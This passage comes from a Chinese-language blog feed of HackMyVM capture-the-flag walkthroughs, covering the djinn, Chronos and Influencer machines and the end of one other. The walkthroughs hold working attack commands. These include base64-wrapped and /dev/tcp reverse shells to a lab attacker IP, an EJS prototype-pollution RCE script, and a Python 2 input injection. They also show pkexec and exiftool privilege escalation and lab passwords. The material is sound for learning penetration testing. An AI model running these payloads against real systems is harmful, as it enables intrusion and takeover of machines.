<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建26个变量，每个变量表示字符串中对应位置的字符</span></span><br><span class="line">a = [Int(<span class="string">&#x27;a[%d]&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 Z3 solver 实例</span></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加字符串长度等于 26 的约束</span></span><br><span class="line">solver.add(<span class="built_in">len</span>(a) == <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加各种条件约束</span></span><br><span class="line">solver.add(a[<span class="number">0</span>] - a[<span class="number">20</span>] == -<span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">1</span>] + a[<span class="number">6</span>] == <span class="number">208</span>)</span><br><span class="line">solver.add(a[<span class="number">2</span>] - a[<span class="number">4</span>] == <span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">3</span>] - a[<span class="number">14</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">4</span>] * a[<span class="number">25</span>] == <span class="number">10100</span>)</span><br><span class="line">solver.add(a[<span class="number">5</span>] + a[<span class="number">17</span>] == <span class="number">219</span>)</span><br><span class="line">solver.add(a[<span class="number">6</span>] - a[<span class="number">10</span>] == -<span class="number">11</span>)</span><br><span class="line">solver.add(a[<span class="number">7</span>] - a[<span class="number">20</span>] == -<span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">8</span>] * a[<span class="number">17</span>] == <span class="number">11845</span>)</span><br><span class="line">solver.add(a[<span class="number">9</span>] - a[<span class="number">18</span>] == -<span class="number">7</span>)</span><br><span class="line">solver.add(a[<span class="number">10</span>] - a[<span class="number">24</span>] == <span class="number">1</span>)</span><br><span class="line">solver.add(a[<span class="number">11</span>] * a[<span class="number">4</span>] == <span class="number">9797</span>)</span><br><span class="line">solver.add(a[<span class="number">12</span>] - a[<span class="number">3</span>] == <span class="number">3</span>)</span><br><span class="line">solver.add(a[<span class="number">13</span>] * a[<span class="number">11</span>] == <span class="number">11252</span>)</span><br><span class="line">solver.add(a[<span class="number">14</span>] - a[<span class="number">13</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">15</span>] == a[<span class="number">23</span>])</span><br><span class="line">solver.add(a[<span class="number">16</span>] - a[<span class="number">8</span>] == -<span class="number">5</span>)</span><br><span class="line">solver.add(a[<span class="number">17</span>] * a[<span class="number">7</span>] == <span class="number">10815</span>)</span><br><span class="line">solver.add(a[<span class="number">18</span>] - a[<span class="number">14</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">19</span>] - a[<span class="number">0</span>] == -<span class="number">8</span>)</span><br><span class="line">solver.add(a[<span class="number">20</span>] - a[<span class="number">23</span>] == <span class="number">4</span>)</span><br><span class="line">solver.add(a[<span class="number">21</span>] + a[<span class="number">7</span>] == <span class="number">220</span>)</span><br><span class="line">solver.add(a[<span class="number">22</span>] - a[<span class="number">1</span>] == <span class="number">15</span>)</span><br><span class="line">solver.add(a[<span class="number">23</span>] == a[<span class="number">15</span>])</span><br><span class="line">solver.add(a[<span class="number">24</span>] * a[<span class="number">2</span>] == <span class="number">12654</span>)</span><br><span class="line">solver.add(a[<span class="number">25</span>] - a[<span class="number">12</span>] == -<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查约束是否满足</span></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(model[a[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;满足条件的字符串为：&quot;</span>, result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;找不到满足条件的字符串&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>跑出来的结果是“满足条件的字符串为： ihopethisisastrongpassword”</p>
<p>这样就拿到第一个密码了，依次输入两个密码拿到一个&#x2F;bin&#x2F;sh，注意这里的点是</p>
<p><strong>程序中open了&#x2F;opt&#x2F;root.pass，但是没有close，可以看一下这个文件相关的进程</strong></p>
<p>“在linux中，每个进程的 <code>/proc/&lt;PID&gt;/fd</code> 目录包含了该进程打开的文件描述符的符号链接。你可以通过查看该目录来了解进程打开的文件描述符的相关信息，可以用<code>ls -l /proc/&lt;PID&gt;/fd</code>查看，而一个进程的PID可以用<code>lsof /path/to/your/file</code>查看”</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ lsof /opt/root.pass</span><br><span class="line">COMMAND PID    USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME</span><br><span class="line">sh      768 shimmer    3r   REG    8,1       15 522246 /opt/root.pass</span><br><span class="line">$ <span class="built_in">ls</span> -l /proc/768/fd</span><br><span class="line">total 0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 0 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 1 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 10 -&gt; /dev/tty</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 2 -&gt; /dev/pts/0</span><br><span class="line">lr-x------ 1 shimmer shimmer 64 mar 18 17:43 3 -&gt; /opt/root.pass</span><br><span class="line">$ <span class="built_in">cd</span> /proc/768/fd</span><br><span class="line">$ <span class="built_in">cat</span> &lt;&amp;3</span><br><span class="line">masteradmin420</span><br></pre></td></tr></table></figure>

<p>一顿操作，就拿到了root的密码，su登陆，提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319004826.png" ></p>
<h4 id="web代码复盘"><a href="#web代码复盘" class="headerlink" title="web代码复盘"></a>web代码复盘</h4><p>在games.php找到跳转explainmepls.php的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$money</span> == <span class="number">0</span> &amp;&amp; <span class="variable">$game</span> != <span class="number">8</span>) &#123; <span class="comment">// 这里就是需要money=0，所以要把钱输光</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$game</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Shell_game&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Russian_roulette&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Dice&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">include_once</span> <span class="string">&quot;./games/error.php&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: explainmepls.php?learnabout=&#x27;</span> . <span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2001.00.46.png" ></p>
<p>触发ssrf漏洞的地方，“<code>file_get_contents()</code> 函数用于从指定的 URL 中获取内容并将其输出。可以通过控制 <code>$learnabout</code> 变量来构造任意 URL”</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>wp说pass那块第一个密码可用angr模块解决，我自己看的时候先想到的是z3，最后也解出来了，后续要学一下</p>
<p>最开始那个赌博游戏也是经过一番探索才找到ssrf那个点，而且刚找到的时候还以为是文件包含（知识不够牢固）关于ssrf利用，端口的fuzz也需要记住，还有就是最后文件打开那块，还能通过lsof找到相关进程，感觉这个思路以后还会遇到，也算是多学习到linux有关的知识了，总的来说这个靶场很值得学习回顾。</p>
<p>所需知识点：ssrf漏洞利用，文件逆向，z3求解，linux进程号查找，端口扫描</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm djinn复盘</title>
    <url>/2024/03/18/hackmyvm-djinn%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/?v=djin" >https://hackmyvm.eu/machines/?v=djin<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>端口扫描，扫到21，1337，7331开放，先用anonymous作为账号密码登陆21号端口，有三个txt文件，下载来看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318105541.png" ></p>
<p>game里面说1337端口有个game，nc连接一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318105737.png" ></p>
<p>是个计算游戏，需要算对一千次，这种就需要写个脚本解决了（以下脚本是参考wp的）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">c = pwn.remote(<span class="string">&#x27;192.168.64.80&#x27;</span>, <span class="string">&#x27;1337&#x27;</span>) <span class="comment"># 建立一个远程联机</span></span><br><span class="line">c.recvuntil(<span class="string">&#x27;gift.\n&#x27;</span>) <span class="comment"># 接收连接中的数据，直到遇到字符串 &#x27;gift.\n&#x27; 为止</span></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">1001</span>: <span class="comment"># 做1000次循环</span></span><br><span class="line">   count += <span class="number">1</span></span><br><span class="line">   data = c.recvuntil(<span class="string">b&quot;)&quot;</span>).decode()</span><br><span class="line">   c.recv() <span class="comment"># 接收连接中的数据，但不做任何处理，用于清空缓冲区</span></span><br><span class="line">   <span class="built_in">print</span>(data)</span><br><span class="line">   num1, num2, todo = <span class="built_in">int</span>(data[<span class="number">1</span>]), <span class="built_in">int</span>(data[<span class="number">9</span>]), data[<span class="number">5</span>]</span><br><span class="line">   <span class="keyword">if</span> todo == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">      answer= num1 + num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">      answer= num1 - num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">      answer= num1 * num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">      answer= num1 / num2</span><br><span class="line">   c.send((<span class="built_in">str</span>(answer) + <span class="string">&quot;\n\r&quot;</span>).encode())</span><br><span class="line">   <span class="keyword">if</span> count &gt; <span class="number">998</span>: <span class="comment"># 打印最后几次的详细信息</span></span><br><span class="line">        <span class="built_in">print</span>(answer, count)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.recv().decode())</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110431.png" ></p>
<p>跑完脚本最后给了三个数字，猜测是敲门，此时22端口是关着的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110523.png" ></p>
<p>按顺序敲门后，22号端口打开了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110607.png" ></p>
<p>接着我想用刚刚拿到的“nitu:81299””nitish81299”尝试登陆ssh，都没有用，这个时候想到之前有个7331端口还没看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2012.07.20.png" ></p>
<p>先扫目录，用了一个大一点的字典后扫到有&#x2F;wish &#x2F;genie</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112555.png" ></p>
<p>访问&#x2F;wish，有个可以execute的，输入id试试</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318111003.png" ></p>
<p>跳转到了genie，注意url有出现www-data，说明是执行成功的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318111039.png" ></p>
<p>接下来反弹shell，经过多次尝试，发现可以利用拿到第一个shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ` <span class="built_in">echo</span> <span class="string">&quot;cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjY0LjMgODg4OCA+L3RtcC9m&quot;</span> | <span class="built_in">base64</span> -d ` | sh -</span><br><span class="line"></span><br><span class="line"><span class="built_in">base64</span>解码的内容是：<span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.64.3 8888 &gt;/tmp/f</span><br><span class="line">管道 ｜sh - 表示讲解码后的内容交给sh当成脚本执行</span><br></pre></td></tr></table></figure>

<h4 id="提权方式1"><a href="#提权方式1" class="headerlink" title="提权方式1"></a>提权方式1</h4><p>拿到第一个shell后，使用find查看有没有什么可以用（sudo -l找不到什么可以用的）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>看到pkexec可以用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2011.18.35.png" ></p>
<p>查找到版本是0.105，上网搜索了一下有没有可以用的脚本，最后找到<a class="link"   href="https://www.hackingarticles.in/linux-privilege-escalation-pwnkit-cve-2021-4034/" >https://www.hackingarticles.in/linux-privilege-escalation-pwnkit-cve-2021-4034/<i class="fas fa-external-link-alt"></i></a> 可以用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2011.21.58.png" ></p>
<p>成功提权到root</p>
<h4 id="提权方法2"><a href="#提权方法2" class="headerlink" title="提权方法2"></a>提权方法2</h4><p>切换到home目录下，有nitish和sam两个用户，sam目录进不去，在nitish目录的.dev目录下有个creds.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112450.png" ></p>
<p>有一个密码，接下来用ssh登陆nitish账户</p>
<p>p4ssw0rdStr3r0n9</p>
<p>sudo -l发现有个genie可以利用，在网上找现成的提权方式失败</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112652.png" ></p>
<p>-h查看帮助，有一个-e执行cmd，但是还是失败了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112941.png" ></p>
<p>然后用man查看genie，发现有个cmd</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113121.png" ></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u sam /usr/bin/genie -cmd 随便写点</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113234.png" ></p>
<p>成功拿到sam的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113352.png" ></p>
<p>sudo -l看到有个lago可以利用，执行看看，测试了一下，有几个选项，其中比较有用的是有个猜数游戏</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113515.png" ></p>
<h5 id="解决思路1（暴力）"><a href="#解决思路1（暴力）" class="headerlink" title="解决思路1（暴力）"></a>解决思路1（暴力）</h5><p>用个一直循环的脚本，一直坚持猜同一个数字，看运气，总有能猜对的时候</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> sudo /root/lago; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113812.png" ></p>
<h5 id="解决思路2"><a href="#解决思路2" class="headerlink" title="解决思路2"></a>解决思路2</h5><p>在&#x2F;home&#x2F;sam的目录下有个.pyc文件，下载下来反编译一下，就能看到lago的源码，注意到</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318114957.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2012.08.59.png" ></p>
<p>选项2那里有个判断，要判断s是否等于num，那直接输入num，input把你传递的num当成了一个变量（注意靶机的pyhton版本是2.x，如果是3以上的版本这个思路不行），num&#x3D;num自然就可以了，神奇。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318115124.png" ></p>
<p>也可以利用input的动态载入，也能拿到root</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;/bin/bash&#x27;)</span><br></pre></td></tr></table></figure>

<p>输入这个python2的input支持动态载入，把这个语句当成表达式执行，如果是pyhton3就只会当成字符串</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113923.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机涉及到的知识点比较多：ftp下载文件，远程计算器脚本的编写，ssh敲门打开端口，反弹shell的绕过方法，pkexec的提权，man查看使用手册（比–help详细），pyc反编译，python2中input的智能转换和动态载入的利用，都很值得学习。</p>
<p>在整个过程中，信息搜集一如既往的重要。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm Chronos复盘</title>
    <url>/2024/06/21/hackmyvm-Chronos%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>一个考验细心的靶场，我还挺被卡的，也是给我一个教训，写复盘主要是记录回顾，做出来主要还是参考了大佬的wp，写完wp还是意识到自己基础太弱，希望暑假能静下心好好补基础</p>
<p>主要参考：</p>
<p><a class="link"   href="https://al1enum.github.io/docs/Chronos.pdf" >https://al1enum.github.io/docs/Chronos.pdf<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.bilibili.com/video/BV15o4y1z73N/?vd_source=04ff153ff0b36e8676b4638902ed9f4b" >https://www.bilibili.com/video/BV15o4y1z73N/?vd_source=04ff153ff0b36e8676b4638902ed9f4b<i class="fas fa-external-link-alt"></i></a> （讲的很细，推荐）</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>前期看到开了22，80，8000端口，先看80和8000</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174335.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174353.png" ></p>
<p>最开始拿到两个网页，内容差不多，查看源代码也没看到什么新东西，扫了很久目录扫到一个&#x2F;date，访问之后是一些报错，暂时对我没什么帮助，这个时候我就被卡住了。。。。</p>
<p>然后我就看了wp提示，要观察访问网站的请求包</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174604.png" ></p>
<p>可以看到这里有个域名，要编辑一下&#x2F;etc&#x2F;hosts了，再访问</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174835.png" ></p>
<p>主要到&#x2F;data?format&#x3D;有一段内容，尝试拿去解码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174930.png" ></p>
<p>base58解码后发现这是一个显示时间的命令，至于为什么会Permission Denied，经过研究，发现是请求包的缺少了特定的ua头（正常抓包能发现是有的）<strong>（后来发现网站源码有一段被混淆的代码，解混淆后也能知道要求有特定ua头才能执行代码）</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621175416.png" ></p>
<p>于是加上之后才能正确看到时间</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621175458.png"   style="zoom:50%;" >

<h4 id="功能点利用"><a href="#功能点利用" class="headerlink" title="功能点利用"></a>功能点利用</h4><p>知道有这个功能点，可以尝试命令注入，format参数接收命令，于是尝试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.64.3/8888 0&gt;&amp;1&#x27;</span><br><span class="line">base58编码：YLAX9KhLnbeXJEfvdxJCU6qbixB1RzHhWDZ87VijVMTAtiYpjwpV2jJXtqZBGQg1uLKckNVQHium3Ca</span><br></pre></td></tr></table></figure>

<p>成功反弹到shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>看了一下靶机开放的端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623102311.png" ></p>
<p>发现内网还开了一个8080端口，curl一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623105206.png" ></p>
<p>发现有Chronos version2，回到上一级目录，有一个chronos-v2，看一下代码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623105320.png" ></p>
<p>ejs库使用<code>express-fileupload</code>来处理文件上传，有一个利用原型链污染的poc（还不是很懂原理）可以直接用</p>
<p><a class="link"   href="https://github.com/boiledsteak/EJS-Exploit/blob/main/attacker/EJS-RCE-attack.py" >https://github.com/boiledsteak/EJS-Exploit/blob/main/attacker/EJS-RCE-attack.py<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">### commands to run on victim machine</span><br><span class="line">cmd = &#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.64.3/1234 0&gt;&amp;1&quot;&#x27;</span><br><span class="line"></span><br><span class="line">print(&quot;Starting Attack...&quot;)</span><br><span class="line">### pollute</span><br><span class="line">requests.post(&#x27;http://127.0.0.1:8080&#x27;, files = &#123;&#x27;__proto__.outputFunctionName&#x27;: (</span><br><span class="line">    None, f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;&#123;cmd&#125;&#x27;);x&quot;)&#125;)</span><br><span class="line"></span><br><span class="line">### execute command</span><br><span class="line">requests.get(&#x27;http://127.0.0.1:8080&#x27;)</span><br><span class="line">print(&quot;Finished!&quot;)</span><br></pre></td></tr></table></figure>

<p>执行这个poc就能得到imera的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623110405.png" ></p>
<p>然后sudo -l就能看到有node和npm可以用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623110430.png" ></p>
<p>直接gtfobins利用node一把梭，提权成功，结束</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623110532.png" ></p>
]]></content>
      <tags>
        <tag>复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm influencer复盘</title>
    <url>/2024/04/05/hackmyvm-influencer%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Influencer" >https://hackmyvm.eu/machines/machine.php?vm=Influencer<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：medium</p>
<p>ip：192.168.64.115(后变成116)</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>nmap扫到2121端口（是ftp服务（和80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405154528.png" ></p>
<p>无密码连接ftp，有一个note.txt提示有个wordpress站点，还有很多张图片，用工具分析了图片，找到snapchat.jpg有隐藏信息</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405154710.png" ></p>
<p>给了一串密码，还要看用户名</p>
<p>看看80端口，到目录扫到&#x2F;wordpress，很容易就找到登录口，用wpscan扫描，扫到一个用户名luna，尝试用刚刚到密码登录，失败，rockyou.txt爆破也没有结果，然后就去站点本身看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155202.png" ></p>
<p>看到有关luna的个人信息，用社工工具生成一个字典</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-05%2015.54.55.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155651.png" ></p>
<p>然后用wpscan爆破出密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155805.png" ></p>
<p>成功爆破出来，登录后台</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155939.png" ></p>
<p>找到appearance-&gt;theme file editor，修改php文件，写入后门文件，本地开启监听</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160202.png" ></p>
<p>成功拿到www-data的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160255.png" ></p>
<h4 id="userflag"><a href="#userflag" class="headerlink" title="userflag"></a>userflag</h4><p>ss -lntp查看开放了什么端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160424.png" ></p>
<p>注意到有个1212端口，先用socat转发出去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:4444,fork TCP:localhost:1212 &amp; </span><br></pre></td></tr></table></figure>

<p>然后访问4444端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160617.png" ></p>
<p>看来是个ssh服务，那就用ssh连接，用最开始在图片里拿到的密码，成功登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh luna@192.168.64.116 -p 4444</span><br><span class="line">密码：u3jkeg97gf</span><br></pre></td></tr></table></figure>

<p>然后使用sudo -l查到juan可以免密码执行exiftool</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160840.png" ></p>
<p>再查询知道exiftool可以写文件，<strong>思路是在juan的.ssh目录下写一个authorized_keys</strong>,然后ssh连接登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">luna@influencer:~$ cd /tmp</span><br><span class="line">luna@influencer:/tmp$ echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8pW4mmY4tPKfm6n1XBJldNxoo+ehIpzS1Y1kI32qU8fLVbraU85pjcPUK7pHcvoKfBl02hjpKhsTSHHG5iEsaCAMrD8euYDfNRKu0ITfX5EukM8JhDXEgWzGWlieF9KEB0haZJyFm6lIVPK950FtElXNZGagQ3wyQoVGRnoUhTlyeK5BcFbFlnMZdndOEB8TPOTzc13SpfCSU7lF4YckPjqgV1Y45kDEvJViv9xMPEd0be80F+lJ1J2/qywFTySfVlOqsFOzp3m3fLyUb80yk8Qs0BSR5q1NXexHXfCPwBbDW6vX4iygbSm1TRei2kre0CvsqUEgGipCmJTdkPQyr+ZFTZl/0DlSX07ZSrat9NAbXc+MfG5j0QsgebkjR4aWQxAym/yEfe7WGyOZdf43rxzS61dToq9CBrTQUapmwg6efBTwlEeMVA+fSK5bqxDvD1quCLoMrSonc7v4OKkopaB3hUfdM/YwGexHk7DLtsE50O80wMajhYy8aR4N4aI8= root@kali&#x27; &gt; abc</span><br><span class="line">luna@influencer:/tmp$ chmod 777 abc</span><br><span class="line">luna@influencer:/tmp$ sudo -u juan /usr/bin/exiftool -filename=/home/juan/.ssh/authorized_keys abc</span><br></pre></td></tr></table></figure>

<p>成功在本地登录</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161301.png"   style="zoom:50%;" >

<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l查到是免密码执行一个脚本，脚本内容是给server.hmv发送请求</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161444.png" ></p>
